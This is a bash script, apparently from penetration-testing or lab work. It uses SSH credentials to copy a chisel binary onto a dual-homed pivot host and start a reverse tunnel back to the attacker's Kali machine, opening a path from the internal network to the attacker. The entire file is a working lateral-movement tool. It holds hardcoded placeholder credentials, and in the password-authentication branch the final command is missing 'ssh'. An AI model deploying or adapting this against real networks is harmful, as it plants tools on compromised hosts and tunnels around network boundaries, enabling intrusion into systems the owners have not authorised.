#!/bin/bash
#
# Use when you have SSH creds to a dual honed host and want to allow clients from the internal network to reach back to kali.
# Requires root access if you want to open a low port on proxy server
# This script will create a directory on the pivot machine, send chisel to the pivot machine, and create a tunnel back to kali

kali_listen_port=8001 		#Port to open on kali to receive chisel connection
kali_proxy_port=8002  		#Local port to forward remote connections to 
proxy_ip="10.10.10.10" 		#Host IP with ssh creds to use as a pivot
remote_dir="/path/to/create"	#Directory to create on pivot machine
chisel_binary="/path/to/chisel"	#Local path of chisel binary to send to pivot machine

ssh_user="root"
ssh_pass="password"
ssh_key_file="/path/to/key_file"

chisel_user="user"
chisel_pass="securepass"

#Pulls IP from tun0 interface
tun0="$(ifconfig | grep tun0 -a1 | grep inet | cut -d " " -f 10)"
kali_ip=$tun0

RED='\033[0;31m'
NC='\033[0m'

echo Start the chisel listener before you continue: $chisel_binary server --auth $chisel_user:$chisel_pass -p $kali_listen_port -v
read -p "Did you start the chisel server? [Y/n] " -n 1 -r
echo

if [[ ! $REPLY =~ ^[Yy]$ ]]
then
    exit 1
fi
read -p "Whats the server's fingerprint? " fingerprint
read -p "What port do you want to open on the proxy server? " proxy_listen_port
echo

PS3="Are you using SSH password or public key authentication? "
options=("Password" "Public Key" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Password")
	    echo Using password authentication
	    echo Creating directory $remote_dir on $proxy_ip...
	    sshpass -p $ssh_pass ssh $ssh_user@$proxy_ip "mkdir $remote_dir"
	    
	    echo Sending chisel binary to $proxy_ip at $remote_dir/chisel...
	    sshpass -p $ssh_pass scp $chisel_binary $ssh_user@$proxy_ip:$remote_dir/chisel

	    echo Sending tunnel to port $kali_listen_port on kali...
	    printf "Everything sent to $proxy_ip (remember to send traffic to dual honed IP) on port $proxy_listen_port will be forwarded to ${RED}127.0.0.1:$kali_proxy_port${NC}\n"
	    sshpass -p $ssh_pass  $ssh_user@$proxy_ip "$remote_dir/chisel client --auth $chisel_user:$chisel_pass --fingerprint $fingerprint $kali_ip:$kali_listen_port $proxy_listen_port:127.0.0.1:$kali_proxy_port"
	    break
	    ;;
	"Public Key")
	    echo Using public key authentication
	    echo Creating directory $remote_dir on $proxy_ip...
	    ssh -i $ssh_key_file $ssh_user@$proxy_ip "mkdir $remote_dir"
	    
	    echo Sending chisel binary to $proxy_ip at $remote_dir/chisel...
            scp -i $ssh_key_file $chisel_binary $ssh_user@$proxy_ip:$remote_dir/chisel
	    
	    echo Sending tunnel to port $kali_listen_port on kali...
	    printf "Everything sent to $proxy_ip (remember to send traffic to dual honed IP) on port $proxy_listen_port will be forwarded to ${RED}127.0.0.1:$kali_proxy_port${NC}\n"
	    ssh -i $ssh_key_file $ssh_user@$proxy_ip "$remote_dir/chisel client --auth $chisel_user:$chisel_pass --fingerprint $fingerprint $kali_ip:$kali_listen_port $proxy_listen_port:127.0.0.1:$kali_proxy_port"
	    break
	    ;;
	"Quit")
	    break
	    ;;
	*) echo "Invalid option $REPLY";;
    esac
done
